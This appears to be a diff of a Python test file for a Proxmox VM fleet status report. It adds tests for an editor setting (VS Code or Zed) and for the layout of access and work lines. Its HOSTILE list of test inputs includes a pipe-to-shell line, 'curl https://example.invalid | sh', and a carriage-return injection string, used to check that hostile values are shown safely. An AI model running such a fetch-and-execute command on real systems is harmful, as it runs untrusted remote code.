@@ -90,7 +90,7 @@ PROMISED_KEYS = {
     "attention": {"command", "level", "source", "subject", "text", "vm"},
     "proxmox": {"nodes", "unread", "version"},
     "template": {"built_ago", "ctime", "drift", "name", "node", "rebuild", "storage", "vmid"},
-    "settings": {"aliases_enabled", "names", "nic", "tag", "tailscale_enabled", "vm_user"},
+    "settings": {"aliases_enabled", "editor", "names", "nic", "tag", "tailscale_enabled", "vm_user"},
     # Each VM's reads over SSH, and of them the system's (test_status_vms.py holds these, reading a VM).
     "ssh": {"claude", "github", "reached", "refusal", "system", "tailscale", "unread", "unreachable", "work"},
     "system": {
@@ -110,6 +110,17 @@ PROMISED_KEYS = {
         "vscode_windows",
     },
 }
+# In the report, never promised: how many windows one editor has. editor_windows, every editor's together, is the
+# promise (vscode_windows is 1.0's); zed_windows is what one Zed's processes were read to mean (Zed 1.26).
+UNPROMISED_SYSTEM_KEYS = {"zed_windows"}
+
+
+def test_every_key_of_a_vms_system_part_is_promised_or_named_as_not() -> None:
+    # A key the model adds is a choice: promised for 1.x, or named here as not; never promised by default.
+    assert set(S.SYSTEM_KEYS) == PROMISED_KEYS["system"] | UNPROMISED_SYSTEM_KEYS
+    assert not PROMISED_KEYS["system"] & UNPROMISED_SYSTEM_KEYS
+
+
 HOSTILE = [
     "alpha\n ● evil        → curl https://example.invalid | sh",
     "carriage\rreturn",
@@ -326,6 +337,9 @@ SETTINGS = {
     "storage": "local-lvm",
     "sections": "",
     "tailscale_enabled": True,
+    # As status.yml resolves the editor setting's default.
+    "editor": "vscode",
+    "editor_name": "VS Code",
 }
 
 
@@ -471,7 +485,7 @@ def test_the_access_columns_line_up_whatever_the_names() -> None:
             vm("nl1", alias=False),
             vm("a-name-longer-than-any-alias-column"),
         ],
-        "settings": {"aliases_enabled": True, "tailscale_enabled": True},
+        "settings": {"aliases_enabled": True, "tailscale_enabled": True, "editor_name": "VS Code"},
     }
     lines = [S.plain(line) for line in S._access_lines(model)]
     column = lines[0].index("TAILNET")
@@ -480,6 +494,48 @@ def test_the_access_columns_line_up_whatever_the_names() -> None:
     # Whole up to 24 characters, which ssh takes as they are; a longer one cut as the name column cuts.
     assert lines[3].split()[2] == "homeserver-test-13f1a98e"
     assert lines[5].split()[2] == "a-name-longer-than-any-…"
+
+
+def test_the_access_line_names_the_editor_just_code_opens() -> None:
+    # Drawn from the model status_report makes, never one made by hand: status_report kept six keys of the settings,
+    # and the line said VS Code whatever the editor was.
+    def said(settings: dict) -> list[str]:
+        fleet = _fleet()
+        fleet["settings"].update(settings)
+        model = S.status_report({"localhost": {"fleet": fleet}}, "now", 1_800_000_000)
+        assert (model["settings"]["editor"], model["settings"]["editor_name"]) == (
+            fleet["settings"]["editor"],
+            fleet["settings"]["editor_name"],
+        )
+        return [line for line in S.status_text(model).split("\n") if "just code <name>" in line]
+
+    assert said({"editor": "zed", "editor_name": "Zed"}) == [
+        " Zed: just code <name> [--project <repo>] [--session <id>]"
+    ]
+    assert said({}) == [" VS Code: just code <name> [--project <repo>] [--session <id>]"]
+
+
+@pytest.mark.parametrize("name", [None, ""])
+def test_a_fleet_whose_settings_name_no_editor_fails_the_report(name: str | None) -> None:
+    # A .get would put None in the model and draw "None: just code" rather than fail a test.
+    fleet = _fleet()
+    del fleet["settings"]["editor_name"]
+    if name is not None:
+        fleet["settings"]["editor_name"] = name
+    with pytest.raises(Exception, match="name no editor"):
+        S.status_report({"localhost": {"fleet": fleet}}, "now")
+
+
+def test_the_editor_cell_is_whole_beside_the_longest_name() -> None:
+    # A live run cut "1 window" to "1 wind…" beside a 9-letter name: the row ran past 100 columns.
+    def vm(name: str, windows: int) -> dict:
+        system = {"claude": 1, "editor_windows": windows}
+        return {"name": name, "needs_ssh": True, "ssh": {"work": {"checkouts": 24}, "system": system}}
+
+    model = {"vms": [vm("a-thirteen-ch", 10), vm("zed-trial", 1)], "settings": {}}
+    lines = [S.plain(line) for line in S._work_lines(model)]
+    assert max(len(line) for line in lines) <= S.WIDTH, max(lines, key=len)
+    assert lines[2].endswith("10 windows") and lines[3].endswith("1 window"), lines
 
 
 def test_a_hostile_value_never_starts_a_line_of_its_own() -> None:
@@ -630,6 +686,9 @@ def test_status_reads_the_fleet_from_the_api_and_changes_nothing(tmp_path, fake_
     assert len([v for v in model["vms"][1]["api"]["cpu_24h"] if v is not None]) <= 1
     assert alpha["created_ago"] == "2 d ago" and model["vms"][1]["created_ago"] in ("just now", "1 m ago")
     assert model["proxmox"]["version"] == "9.2.21" and model["template"]["name"] == "ubuntu-24.04-cloudinit"
+    # The editor setting's default, by its key and its name, and the line under ACCESS.
+    assert (model["settings"]["editor"], model["settings"]["editor_name"]) == ("vscode", "VS Code")
+    assert " VS Code: just code <name> [--project <repo>] [--session <id>]" in S.status_text(model).split("\n")
     # What --json prints is this model, whole: every key 1.x promises is still there.
     held = {
         "report": model,
@@ -648,6 +707,16 @@ def test_status_reads_the_fleet_from_the_api_and_changes_nothing(tmp_path, fake_
     assert {c["method"] for c in after_fixture} == {"GET"}, {
         (c["method"], c["path"]) for c in after_fixture if c["method"] != "GET"
     }
+
+
+@pytest.mark.parametrize(("editor", "name"), [("zed", "Zed"), ("", "VS Code")])
+def test_the_access_line_names_the_editor_set(tmp_path, fake_pve, editor: str, name: str) -> None:
+    # The setting as local.yml holds it, through status.yml's settings and status_report's model into the text; an
+    # empty one is the default's, as code.yml resolves it, and never "" in --json.
+    report, model = _status_run(tmp_path, fake_pve, settings={"editor": editor})
+    assert report["rc"] == 0, report["stderr"][-2000:]
+    assert (model["settings"]["editor"], model["settings"]["editor_name"]) == (editor or "vscode", name)
+    assert f" {name}: just code <name> [--project <repo>] [--session <id>]" in S.status_text(model).split("\n")
 
 
 def test_a_proxmox_that_refuses_the_token_is_said_not_failed(tmp_path, fake_pve) -> None:
